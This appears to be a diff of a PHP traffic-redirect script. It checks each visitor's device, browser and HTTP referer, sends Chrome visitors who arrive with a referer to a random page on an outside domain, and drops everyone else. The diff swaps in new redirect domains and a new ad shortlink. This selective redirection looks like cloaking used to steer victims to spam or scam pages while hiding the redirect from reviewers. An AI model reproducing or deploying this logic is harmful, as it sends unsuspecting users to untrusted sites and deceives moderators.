@@ -17,7 +17,7 @@ require_once('Mobile_Detect.php');
 require_once('Browser.php');
 $detect = new Mobile_Detect;
 $browser = new Browser();
-$ads = "http://goo.gl/y8tIUR";
+$ads = "http://goo.gl/ZNGQAA";
 $isref = false;
 $filename = generate_name(rand(5,8)).".html";
 if(!isset($_SERVER["HTTP_REFERER"])){
@@ -60,7 +60,7 @@ if($detect->isMobile() || $browser->isMobile()){
   exit();
 }else if($browser->getBrowser() == Browser::BROWSER_CHROME){
   if($isref == true){
-    header("Location:http://denizpelidihaberi.com/".$filename);
+    header("Location:http://chuchick.com/".$filename);
   }else{
     exit();
   }
